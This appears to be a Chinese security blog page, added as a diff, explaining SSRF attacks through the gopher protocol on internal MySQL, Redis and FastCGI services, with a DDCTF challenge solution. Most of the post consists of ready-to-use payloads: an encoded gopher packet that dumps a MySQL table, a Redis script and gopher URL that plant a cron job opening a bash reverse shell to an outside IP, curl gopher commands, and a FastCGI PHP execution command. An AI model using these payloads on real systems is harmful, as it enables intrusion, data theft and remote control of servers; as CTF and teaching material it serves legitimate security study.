@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web安全," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离怀秋" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="gopher协议攻击内网Mysql前言SSRF(Server-Side Request Forgery)服务端请求伪造攻击，是由攻击者构造形成由服务器端发起请求的漏洞，SSRF攻击的目标通常为内网应用，如Mysql,redis,Fastcgi等。 Mysql介绍Mysql分为服务端和客户端，客户端连接服务端的三种方式为： 123Unix套接字；内存共享&#x2F;命名管道；TCP&#x2F;IP套">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Gopher协议邂逅内网应用">
+<meta property="og:url" content="http://yoursite.com/2019/06/30/Gopher%E5%8D%8F%E8%AE%AE%E9%82%82%E9%80%85%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8/index.html">
+<meta property="og:site_name" content="离怀秋">
+<meta property="og:description" content="gopher协议攻击内网Mysql前言SSRF(Server-Side Request Forgery)服务端请求伪造攻击，是由攻击者构造形成由服务器端发起请求的漏洞，SSRF攻击的目标通常为内网应用，如Mysql,redis,Fastcgi等。 Mysql介绍Mysql分为服务端和客户端，客户端连接服务端的三种方式为： 123Unix套接字；内存共享&#x2F;命名管道；TCP&#x2F;IP套">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/08/VBsA0I.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/08/VBsIHI.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/08/VByK56.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/09/VsdBd0.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/09/Vswtk6.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/30/Zlv7Mn.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/06/30/ZlzptS.png">
+<meta property="article:published_time" content="2019-06-30T04:13:37.000Z">
+<meta property="article:modified_time" content="2019-06-30T04:15:04.000Z">
+<meta property="article:author" content="离怀秋">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/06/08/VBsA0I.md.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/06/30/Gopher协议邂逅内网应用/"/>
+
+
+
+
+
+  <title>Gopher协议邂逅内网应用 | 离怀秋</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/lihuaiqiu" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离怀秋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">穷且益坚，不负青云之志</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/30/Gopher%E5%8D%8F%E8%AE%AE%E9%82%82%E9%80%85%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离怀秋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离怀秋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Gopher协议邂逅内网应用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-30T12:13:37+08:00">
+                2019-06-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="gopher协议攻击内网Mysql"><a href="#gopher协议攻击内网Mysql" class="headerlink" title="gopher协议攻击内网Mysql"></a>gopher协议攻击内网Mysql</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>SSRF(Server-Side Request Forgery)服务端请求伪造攻击，是由攻击者构造形成由服务器端发起请求的漏洞，SSRF攻击的目标通常为内网应用，如<code>Mysql,redis,Fastcgi</code>等。</p>
+<h4 id="Mysql介绍"><a href="#Mysql介绍" class="headerlink" title="Mysql介绍"></a>Mysql介绍</h4><p>Mysql分为服务端和客户端，客户端连接服务端的三种方式为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Unix套接字；</span><br><span class="line">内存共享&#x2F;命名管道；</span><br><span class="line">TCP&#x2F;IP套接字</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在<code>Linux</code>环境下，客户端输入<code>mysql -u root -p root</code>登陆<code>Mysql</code>服务器用的则为Unix嵌套字连接；<code>Unix</code>并不是一个网络协议，只能在客户端与服务器端在同一台电脑上才可以使用。</li>
+<li><code>windows</code>系统中客户端与Mysql服务器在同一台电脑，则使用命名管道/内存共享。</li>
+<li>TCP/IP套接字是任何系统下都可以使用的方式，也是最多的连接方式，当输入<code>mysql -h 127.0.0.1 -u root -p root</code>时使用的就是TCP/IP嵌套字。</li>
+</ul>
+<h4 id="Mysql认证过程："><a href="#Mysql认证过程：" class="headerlink" title="Mysql认证过程："></a>Mysql认证过程：</h4><p>Mysql客户端连接登陆服务器端有两种方式:</p>
+<ul>
+<li>密码认证：服务器先发送salt然后使用salt进行加密密码然后验证</li>
+<li>无密码认证：客户端直接发送TCP/IP数据包</li>
+</ul>
+<p>在非交互模式下登陆操作<code>Mysql</code>是在无需密码认证，非授权情况下进行的，而<code>SSRF</code>漏洞攻击内网<code>Mysql</code>也是在非授权情况下也就是无密码认证的情况下进行的。</p>
+<h4 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h4><p>准备过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &#39;lihuaiqiu&#39;@&#39;localhost&#39;;</span><br><span class="line">grant all privileges on *.* to lihuaiqiu@localhost identified by &#39;&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>开启一个终端无密码认证登陆<code>Mysql</code></p>
+<p><code>mysql -h 127.0.0.1 -u lihuaiqiu</code></p>
+<p>进行一系列操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use ssrf;</span><br><span class="line"></span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">select * from flag;</span><br></pre></td></tr></table></figure>
+
+<p>另开一个端口监听<code>3306</code>流量</p>
+<p><code>tcpdump –i lo port 3306 –w hua1.pcay</code></p>
+<p>用wireshark打开监听到的数据包</p>
+<p><a href="https://imgchr.com/i/VBsA0I" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/08/VBsA0I.md.png" alt="VBsA0I.md.png"></a></p>
+<p>将数据转化为原始数据，并且进行格式转化</p>
+<p><a href="https://imgchr.com/i/VBsIHI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/08/VBsIHI.md.png" alt="VBsIHI.md.png"></a></p>
+<p>执行生成出来的代码，回显结果</p>
+<p><a href="https://imgchr.com/i/VByK56" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/08/VByK56.md.png" alt="VByK56.md.png"></a></p>
+<p>成功打出数据库中的内容。</p>
+<h4 id="gopher协议与Mysql客户端任意文件读取组合拳"><a href="#gopher协议与Mysql客户端任意文件读取组合拳" class="headerlink" title="gopher协议与Mysql客户端任意文件读取组合拳"></a>gopher协议与Mysql客户端任意文件读取组合拳</h4><p>我的前几个博客中是有讲到客户端任意文件读取漏洞的，详情请移步<a href="https://lihuaiqiu.github.io/2019/06/01/Mysql客户端任意文件读取/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/06/01/Mysql%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</a></p>
+<p>组合拳思考:虽然<code>Mysql</code>伪造出来的恶意服务器在客户端连接的时候有读取任意文件的可能，但是如果我们想要的信息在数据库中，该怎么办？</p>
+<p>这时，扫描器如果进行的是无密码登陆尝试，那么我们就可以在扫描器要扫描的端口上加一个<code>location gopher</code>直接打出数据库中的内容。实战例子：</p>
+<p>DDCTF mysql弱口令：</p>
+<p>这道题其实网上基本都是非预期解法，几乎没有去写用<code>gopher</code>进行<code>ssrf</code>的解法，下面就来讲一下组合拳也就是<code>ssrf</code>的解法。</p>
+<p>扫描器仍然是通过8123端口的<code>agent.py</code>来判断<code>mysqld</code>是否开始，我们在通过伪造的恶意服务器来读取<code>views.py</code>后，发现提示<code>flag in mysql curl@localhost database:security table:flag</code>，所以可以通过在<code>vps</code>中d 8123的端口处加一个<code>location gopher</code>打出数据库的内容,<code>gopher</code>数据构造步骤如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -u curl</span><br><span class="line"></span><br><span class="line">use security;</span><br><span class="line"></span><br><span class="line">select * from flag;</span><br><span class="line"></span><br><span class="line">exit;</span><br></pre></td></tr></table></figure>
+
+<p><code>tcpdump</code>抓包，转化为原始数据，接进<code>gopher</code>,构造后的数据为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;localhost:3306&#x2F;_%3c%00%00%01%85%a6%0f%20%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%75%72%6c%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%09%00%00%00%02%73%65%63%75%72%69%74%79%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01</span><br></pre></td></tr></table></figure>
+
+<p>在<code>vps</code>上构造一个<code>header location</code>，并且运行在8123端口</p>
+<p><a href="https://imgchr.com/i/VsdBd0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/09/VsdBd0.md.png" alt="VsdBd0.md.png"></a></p>
+<p>PS：将<code>payload.php</code>改为<code>index.php</code></p>
+<p>扫描器访问8123端口就会自动跳转到<code>gopher</code>将自己的数据库信息打出来，访问<a href="http://117.51.147.155:5000/ctf/api/weak_scan?target_ip=vps_ip&amp;target_port=3306" target="_blank" rel="noopener">http://117.51.147.155:5000/ctf/api/weak_scan?target_ip=vps_ip&amp;target_port=3306</a></p>
+<p><a href="https://imgchr.com/i/Vswtk6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/09/Vswtk6.md.png" alt="Vswtk6.md.png"></a></p>
+<p>将得到的<code>base64</code>解码，得到<code>DDCTF{0b5d05d80cceb4b85c8243c00b62a7cd}</code></p>
+<h3 id="gopher协议攻击内网Redis"><a href="#gopher协议攻击内网Redis" class="headerlink" title="gopher协议攻击内网Redis"></a>gopher协议攻击内网Redis</h3><p>redis反弹shell的bash脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 -p $2 flushall</span><br><span class="line">echo -e "\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\n\n"|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure>
+
+<p>利用socat转发流量并且抓取流量</p>
+<p><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code></p>
+<p>另外开启一个窗口运行<code>shell.sh</code></p>
+<p>抓到的流量如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">2019&#x2F;06&#x2F;30 11:42:08.082682  length&#x3D;18 from&#x3D;0 to&#x3D;17</span><br><span class="line">*1\r</span><br><span class="line">$8\r</span><br><span class="line">flushall\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.092805  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.097266  length&#x3D;88 from&#x3D;0 to&#x3D;87</span><br><span class="line">*3\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$1\r</span><br><span class="line">1\r</span><br><span class="line">$61\r</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;139.224.236.99&#x2F;8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.097445  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line"></span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.101113  length&#x3D;57 from&#x3D;0 to&#x3D;56</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$16\r</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.101333  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.105326  length&#x3D;52 from&#x3D;0 to&#x3D;51</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$10\r</span><br><span class="line">dbfilename\r</span><br><span class="line">$4\r</span><br><span class="line">root\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.105483  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.108754  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">save\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.118761  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.122934  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">quit\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.123111  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br></pre></td></tr></table></figure>
+
+<p>转换为<code>gopher</code>的规则为：</p>
+<ul>
+<li>如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。</li>
+<li>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</li>
+<li>将\r字符串替换成%0d%0a</li>
+<li>空白行替换为%0a</li>
+</ul>
+<p>别的师傅写好的转化脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">            exp = exp + <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line"><span class="keyword">print</span> exp</span><br></pre></td></tr></table></figure>
+
+<p>转换完结果如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;139.224.236.99&#x2F;8080 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a</span><br></pre></td></tr></table></figure>
+
+<p>最终攻击效果</p>
+<p><img src="https://s2.ax1x.com/2019/06/30/Zlv7Mn.png" alt="Zlv7Mn.png"></p>
+<p>其实想要的结果对应的键对值这样..完全不必用反弹shell这么麻烦的方法..</p>
+<p>例如key中有我们想要的结果.我们完全可以通过如下操作拿到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_keys%20*%20%0d%0aquit&quot;</span><br><span class="line"></span><br><span class="line">curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_type%20flag%0d%0aquit&quot;</span><br><span class="line"></span><br><span class="line">curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_get%20flag%0d%0aquit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/06/30/ZlzptS.png" alt="ZlzptS.png"></p>
+<h3 id="gopher协议攻击内网Fastcgi"><a href="#gopher协议攻击内网Fastcgi" class="headerlink" title="gopher协议攻击内网Fastcgi"></a>gopher协议攻击内网Fastcgi</h3><p>在上次博客中写了<code>Fastcgi</code>未授权访问，如果外网开了9000端口，可能造成任意php代码执行，如果没开，可以通过ssrf打一波，下面来介绍一下<code>ssrf</code>的操作</p>
+<p>通过将流量打到3333端口，再进行编码操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py 127.0.0.1 &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php -c &quot;&lt;?php echo &#96;pwd&#96;; ?&gt;&quot; -p 2333</span><br></pre></td></tr></table></figure>
+
+<p>另外开一个端口</p>
+<p><code>nc -lvvp 3333&gt; gopher.txt</code></p>
+<p>再利用<code>python quote</code>函数编码得到<code>gopher</code>的<code>payload</code></p>
+<p>其实这样很是麻烦，可以利用<code>gopherus</code>直接转化出<code>payload</code></p>
